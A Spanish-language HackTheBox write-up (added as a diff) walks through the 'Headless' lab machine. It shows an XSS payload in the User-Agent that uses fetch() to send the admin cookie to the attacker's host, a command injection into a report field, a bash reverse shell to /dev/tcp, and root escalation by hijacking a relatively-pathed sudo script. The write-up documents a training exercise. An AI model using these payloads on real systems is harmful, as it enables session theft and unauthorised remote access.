@@ -1,0 +1,238 @@
+---
+title: "Máquina Headless"
+description: "Resolución de la máquina Headless de HackTheBox"
+categories: ["HackTheBox", "Easy", "Linux"]
+tags: ["XSS", "Command Injection", "sudo"]
+logo: "/assets/writeups/headless/logo.webp"
+---
+
+Un sitio web a estrenar tiene un campo de contacto, dicho campo es reflejado en un dashboard que es vulnerable a XSS, de ahí podremos obtener acceso a la máquina abusando de una inyección de comandos del mismo dashboard. Finalmente escalaremos privilegios sacando provecho de un script de bash que podemos ejecutar con sudo.
+
+## Reconocimiento
+
+La máquina tiene dos puertos abiertos:
+
+```bash
+# Nmap 7.94 scan initiated Sat Mar 23 15:01:02 2024 as: nmap -sS -Pn -n -vvv -p- --open -oN ports --min-rate 200 10.129.188.216
+Nmap scan report for 10.129.188.216
+Host is up, received user-set (0.49s latency).
+Scanned at 2024-03-23 15:01:02 -04 for 333s
+Not shown: 54380 closed tcp ports (reset), 11153 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+5000/tcp open  upnp    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+```
+
+El puerto 5000 parece tener una web que proximamente, estará disponible.
+
+![Web](/assets/writeups/headless/1.png)
+
+Dándole al botón para preguntas nos redirije a un formulario para poder contactar con el soporte de la página. Del resto no hay más nada interesante asi que veamos que hacemos con este formulario.
+
+## Intrusión
+
+Intentando inyectar etiquetas HTML para ver si el panel de quien ve esto es vulnerable a XSS, resulta en un error que llama la atención:
+
+![Blocked](/assets/writeups/headless/2.png)
+
+Nos bloquea el intento; Muestra la información de nuestra petición HTTP en cara y dice que la dirección IP fue anotada y se generó un reporte con la información de nuestro navegador.
+
+Vale, de aquí podemos pensar una cosa: Si dice que generará un reporte con el intento de XSS incluyendo información del navegador, ¿qué sucede si además de meter el código HTML dentro del formulario para generar el reporte, lo metemos en la propia información del navegador? Una de esas piezas valiosas de información puede ser nuestro User-Agent, el header que da información sobre que navegador estamos usando... vamos a probar cambiarlo por algo más.
+
+Interceptando la petición y cambiando el `User-Agent` a:
+
+`<img src="http://<your-ip>:8000/test">`
+
+Al poner en escucha un servidor HTTP en el puerto 8000 y mandar la petición, luego de un momento recibimos una petición:
+
+```bash
+❯ python -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.8 - - [20/Jul/2024 12:03:49] code 404, message File not found
+10.10.11.8 - - [20/Jul/2024 12:03:49] "GET /asd HTTP/1.1" 404 -
+```
+
+Definitivamente, ¡Eso se ve vulnerable a XSS! Ahora, la mejor parte de esto es que si vemos las Cookies, hay una que se llama `is_admin` y no es de tipo `HttpOnly`, por lo que podemos hacer que quien esté viendo la página de reportes nos mande su cookie en la petición HTTP y así usarla nosotros. Colocando lo siguiente en el User-Agent para ejecutar un `fetch` con las cookies del navegador en el path de la URL bastará para recibirla:
+
+```html
+<img src="x" onerror="fetch(`http://<your-ip>:8000/${document.cookie}`)">
+```
+
+```bash
+❯ python -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.8 - - [20/Jul/2024 12:08:55] code 404, message File not found
+10.10.11.8 - - [20/Jul/2024 12:08:55] "GET /is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 404 -
+```
+
+Colocándola en nuestro navegador (Abriendo las herramientas de desarrollador, yendo a almacenamiento y en la sección de cookies verás donde agregarlas), no hará que nada pase al recargar la página, pero si vamos a un sitio que podemos creer que existe como `/dashboard`, tendremos acceso sin problema alguno:
+
+![Dashboard](/assets/writeups/headless/3.png)
+
+Ahora tenemos una parte para generar reportes de la estabilidad del servidor, dándole al botón nos lo generará y podremos ver que simplemente nos dice que todo está correcto, pero si le metemos símbolos extraños ahora no dirá nada, probemos a ver si se ejecuta algún comando metiéndole una cadena al campo como `2023-09-15|ping -c 1 10.10.14.95`
+
+Al ejecutar nuestro sniffer de red en busca de pings ICMP por parte de la máquina, recibiremos un ping al intentar generar el reporte con el nuevo dato de arriba:
+
+```bash
+❯ tshark -i tun0 icmp
+Capturing on 'tun0'
+    1 0.000000000   10.10.11.8 → 10.10.14.95  ICMP 84 Echo (ping) request  id=0x17fc, seq=1/256, ttl=63
+    2 0.000074884  10.10.14.95 → 10.10.11.8   ICMP 84 Echo (ping) reply    id=0x17fc, seq=1/256, ttl=64 (request in 1)
+```
+
+Es un indicio de una inyección de comandos.
+
+y efectivamente, enviar el oneliner favorito de bash para una reverse shell nos dará una consola interactiva a nuestro equipo:
+
+`2023-09-15|bash -c "bash -i >& /dev/tcp/<your-ip>/443 0>&1"`
+
+```bash
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.8 52456
+bash: cannot set terminal process group (1372): Inappropriate ioctl for device
+bash: no job control in this shell
+dvir@headless:~/app$ script /dev/null -c bash # Inicia un nuevo proceso
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+dvir@headless:~/app$ ^Z # CTRL + Z
+[1]  + 5184 suspended  nc -lvnp 443
+
+❯ stty raw -echo; fg  # Pasar los controles de la terminal al proceso
+[1]  + 5184 continued  nc -lvnp 443
+                                   reset xterm  # Reiniciar el tipo de terminal
+dvir@headless:~/app$ export TERM=xterm-256color  # Establecer el terminal a un xterm de 256 colores
+dvir@headless:~/app$ source /etc/skel/.bashrc  # El toque final para darle color
+```
+
+En la carpeta personal del usuario que acabamos de comprometer, encontraremos la primera flag.
+
+```bash
+dvir@headless:~/app$ cd ~
+dvir@headless:~$ ls -la
+total 48
+drwx------  8 dvir dvir 4096 Feb 16 23:49 .
+drwxr-xr-x  3 root root 4096 Sep  9  2023 ..
+drwxr-xr-x  3 dvir dvir 4096 Feb 16 23:49 app
+lrwxrwxrwx  1 dvir dvir    9 Feb  2 16:05 .bash_history -> /dev/null
+-rw-r--r--  1 dvir dvir  220 Sep  9  2023 .bash_logout
+-rw-r--r--  1 dvir dvir 3393 Sep 10  2023 .bashrc
+drwx------ 12 dvir dvir 4096 Sep 10  2023 .cache
+lrwxrwxrwx  1 dvir dvir    9 Feb  2 16:05 geckodriver.log -> /dev/null
+drwx------  3 dvir dvir 4096 Feb 16 23:49 .gnupg
+drwx------  4 dvir dvir 4096 Feb 16 23:49 .local
+drwx------  3 dvir dvir 4096 Sep 10  2023 .mozilla
+-rw-r--r--  1 dvir dvir  807 Sep  9  2023 .profile
+lrwxrwxrwx  1 dvir dvir    9 Feb  2 16:06 .python_history -> /dev/null
+drwx------  2 dvir dvir 4096 Feb 16 23:49 .ssh
+-rw-r-----  1 root dvir   33 Jul 20 18:03 user.txt
+dvir@headless:~$ cat user.txt
+2476d6ecef97458c62f5985078******
+```
+
+## Escalada de privilegios
+
+Podemos ejecutar un script de Bash como sudo
+
+```bash
+dvir@headless:~$ sudo -l
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+dvir@headless:~$ file /usr/bin/syscheck
+/usr/bin/syscheck: Bourne-Again shell script, ASCII text executable
+```
+
+El archivo contiene lo siguiente:
+
+```bash
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+```
+{: file="/usr/bin/syscheck"}
+
+Si lo viste bien, habrás notado que ejecuta un script externo llamado `initdb.sh` para ejecutar el servicio de la base de datos, pero como lo intenta ejecutar utilizando una ruta relativa básicamente lo estará buscando en el directorio en el que estemos
+
+```bash
+dvir@headless:~$ sudo -u root /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 1.9G
+System load average:  0.02, 0.11, 0.09
+Database service is not running. Starting it...
+... nothing happens ...
+```
+
+Esto significa que simplemente podemos crear un script de bash con el mismo nombre en nuestra ruta y esta cosa lo ejecutará como si nada:
+
+```bash
+dvir@headless:~$ cat initdb.sh
+#!/bin/bash
+ls -la /root
+dvir@headless:~$ chmod +x initdb.sh 
+dvir@headless:~$ sudo -u root /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 1.9G
+System load average:  0.20, 0.14, 0.10
+Database service is not running. Starting it...
+total 40
+drwx------  6 root root 4096 Jul 20 18:03 .
+drwxr-xr-x 18 root root 4096 Feb 16 23:49 ..
+lrwxrwxrwx  1 root root    9 Feb  2 16:07 .bash_history -> /dev/null
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+drwx------  5 root root 4096 Sep 10  2023 .cache
+-rw-------  1 root root   20 Feb 17 00:31 .lesshst
+drwxr-xr-x  3 root root 4096 Sep 10  2023 .local
+drwx------  3 root root 4096 Sep 10  2023 .mozilla
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r-----  1 root root   33 Jul 20 18:03 root.txt
+drwx------  2 root root 4096 Sep  9  2023 .ssh
+```
+
+Con esto simplemente agregamos un `bash` u otra cosa al script y ya podremos ejecutar comandos como root para tomar la última flag.
+
+```bash
+dvir@headless:~$ sudo -u root /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 1.9G
+System load average:  0.17, 0.14, 0.10
+Database service is not running. Starting it...
+cd ..
+ls
+dvir
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+root@headless:/home# cd /root
+root@headless:~# ls
+root.txt
+root@headless:~# cat root.txt
+82ede95a45c370c72850c27f53******
+```
